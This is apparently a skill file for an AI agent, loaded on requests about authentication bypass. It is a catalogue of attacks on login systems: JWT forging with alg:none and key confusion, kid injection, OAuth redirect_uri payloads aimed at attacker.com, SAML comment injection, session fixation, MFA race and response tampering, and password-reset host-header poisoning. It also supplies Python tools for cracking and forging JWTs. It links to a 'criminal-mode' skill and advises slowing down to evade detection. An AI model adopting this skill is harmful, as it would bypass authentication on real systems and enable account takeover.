---
name: auth-attack-tools
description: "Authentication attacks — JWT, OAuth, SAML, session, MFA bypass, password reset."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [auth, jwt, oauth, saml, session, mfa, bypass]
    related_skills: [criminal-mode, exploit-tools, bug-classes]
prerequisites:
  commands: [python]
---

# Authentication Attack Tools

## When to Load This Skill

User requests:
- "auth bypass", "JWT", "OAuth", "SAML", "session", "MFA", "password reset"

---

## JWT Attacks

### alg:none
```bash
# Modify header
{"alg": "none", "typ": "JWT"}

# Base64 encode
echo -n '{"alg":"none","typ":"JWT"}' | base64
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# New token
HEADER.PAYLOAD.
```

### Algorithm Confusion (RS256 → HS256)
```python
# Get public key from /jwks.json
# Use public key as HMAC secret
import jwt
token = jwt.encode({"admin": True}, public_key, algorithm="HS256")
```

### kid Injection
```json
{"kid": "../../dev/null"}
{"kid": "../../../../etc/passwd"}
{"kid": "key1' UNION SELECT 'secret'--"}
```

### jku Injection
```json
{"jku": "http://attacker.com/jwks.json"}
```

### None Algorithm
```python
import jwt
payload = {"admin": True}
token = jwt.encode(payload, "", algorithm="none")
```

---

## OAuth Attacks

### Open Redirect in redirect_uri
```
redirect_uri=https://attacker.com
redirect_uri=https://target.com.attacker.com
redirect_uri=https://target.com@attacker.com
redirect_uri=https://target.com/../../attacker.com
```

### State Parameter Missing
```
# CSRF on OAuth flow
# Account linking attack
```

### PKCE Bypass
```
# Remove code_challenge
# Use different code_verifier
```

### Token Leakage
```
# Referrer leakage
# Fragment leakage
# PostMessage leakage
```

---

## SAML Attacks

### XML Signature Wrapping (XSW)
```
# Multiple assertions
# Move signed assertion
# Signature position manipulation
```

### Signature Stripping
```
# Remove signature
# Assertion without signature
```

### Comment Injection
```
username: admin<!---->@attacker.com
```

---

## Session Attacks

### Session Fixation
```bash
# Set session before login
curl -b "session=KNOWN" URL/login
curl -b "session=KNOWN" URL/dashboard
```

### Cookie Manipulation
```
# Decode cookie
echo "BASE64" | base64 -d

# Modify
# Encode back
```

### Session Prediction
```python
# Analyze session patterns
# Brute force weak tokens
```

---

## MFA Bypass

### Response Manipulation
```json
{"mfa_required": false}
{"otp_verified": true}
{"success": true}
```

### Race Condition
```python
# Send multiple OTP attempts simultaneously
for i in range(10):
    threading.Thread(target=verify_otp, args=("000000",)).start()
```

### Backup Code Abuse
```
# Try backup codes
# Brute force backup codes
```

### Fallback to SMS
```
# Switch to SMS from TOTP
# Intercept SMS
```

---

## Password Reset

### Token Prediction
```
# Analyze token pattern
# Sequential tokens
# Time-based tokens
```

### Host Header Injection
```bash
curl -H "Host: attacker.com" URL/forgot-password -d "email=victim@target.com"
```

### IDOR in Reset
```bash
curl URL/reset?token=VICTIM_TOKEN
```

### Email Parameter Pollution
```bash
curl URL/forgot-password -d "email=victim@target.com&email=attacker@evil.com"
```

---

## Python Auth Tools

### JWT Cracker

```python
import jwt
import json

def crack_jwt(token, wordlist):
    with open(wordlist) as f:
        for secret in f:
            try:
                jwt.decode(token, secret.strip(), algorithms=['HS256'])
                return secret.strip()
            except:
                pass
    return None
```

### JWT Forge

```python
import jwt
import base64

def forge_jwt(payload, secret, algorithm='HS256'):
    return jwt.encode(payload, secret, algorithm=algorithm)

def forge_none(payload):
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
    body = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    return f"{header}.{body}."
```

### OAuth Tester

```python
def test_oauth_redirect(base_url, client_id):
    redirects = [
        "https://attacker.com",
        "https://attacker.com@target.com",
        "https://target.com.attacker.com",
        "https://target.com/../../attacker.com",
    ]
    
    results = []
    for redirect in redirects:
        url = f"{base_url}/authorize?client_id={client_id}&redirect_uri={redirect}&response_type=code"
        r = requests.get(url, allow_redirects=False)
        if r.status_code in [301, 302] and 'attacker.com' in r.headers.get('Location', ''):
            results.append({'redirect': redirect, 'vulnerable': True})
    
    return results
```

---

## Output Format

```json
{
  "target": "https://target.com",
  "auth": {
    "type": "JWT",
    "vulnerability": "alg_none",
    "payload": {"admin": true},
    "success": true
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Token rejected | Signature valid | Try different attack |
| No bypass | Strong auth | Check other vectors |
| Rate limited | Detection | Slow down |
